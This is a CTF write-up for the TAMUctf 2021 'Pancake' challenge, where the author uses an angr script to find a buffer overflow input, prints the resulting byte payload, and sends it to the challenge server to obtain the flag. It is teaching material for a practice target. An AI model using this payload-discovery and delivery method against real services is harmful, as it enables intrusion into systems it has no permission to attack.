---
title: "TAMUctf 2021 Pancake Solution"
slug: "pancake-writeup"
date: "2021-04-26 11:39:00.000000"
author_name: "Javantea"
author_email: "jvoss@altsci.com"
draft: false
toc: false
images:
---

TAMUctf 2021
[Pancake](https://ctftime.org/task/15791) - 100 points

>    Attack this binary to get the flag!
>    [pancake](https://tamuctf.com/static-files/pancake)
>    `openssl s_client -connect tamuctf.com:443 -servername pancake -quiet`

Pancake is an easy exploitation challenge I think. I decided to use [angr](https://angr.io/) and was pleasantly surprised that it solved it quite rapidly. It uses the standard format for angr solutions that I've been using for years. I don't know what the exploit payload does. It's not clear at all to me what is going on except that the exploit must have been pretty straightforward. Please look at [angr's documentation](https://github.com/angr/angr-doc/) if you are as impressed as I was with this result.

```python
import angr

p = angr.Project('pancake')

sm = p.factory.simulation_manager()

sm.explore(find=lambda st:(st.posix.dumps(1) != b'' and not st.posix.dumps(1).startswith(b'Try again, you got')))

# stdout is proof of our solution.
sm.found[0].posix.dumps(1)
b'flag: \x80@ \x01\x10\x02\x08\x02\x04\x02   \x10\x80\x01\x02\x08\x10 \x02\x08@\x01\x01 \x01\x02\x10\x08\x80\x01\x10\x10\x02\x10\x08 \x80\x10\x10\x04\x04\x80@\x01\x04\x08\x80\x01\x80\x01 \x80 \x01\x10\x80@\n'

# stdin is the payload that causes the solution to occur.
sm.found[0].posix.dumps(0)
b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf4\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x88f@\x08\xf5\xf5\xf5\xf5\xf5\xf5\x00'

exit(1)

```

```sh
 (echo -e '\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf4\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x88f@\x08\xf5\xf5\xf5\xf5\xf5\xf5'; cat) | openssl s_client -connect tamuctf.com:443 -servername pancake -quiet
depth=0 CN = hulkcybr1
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = hulkcybr1
verify return:1
flag: gigem{b4s1c_b4ff3r_0verfl0w_g03s_y33t}
```

The flag is `gigem{b4s1c_b4ff3r_0verfl0w_g03s_y33t}`

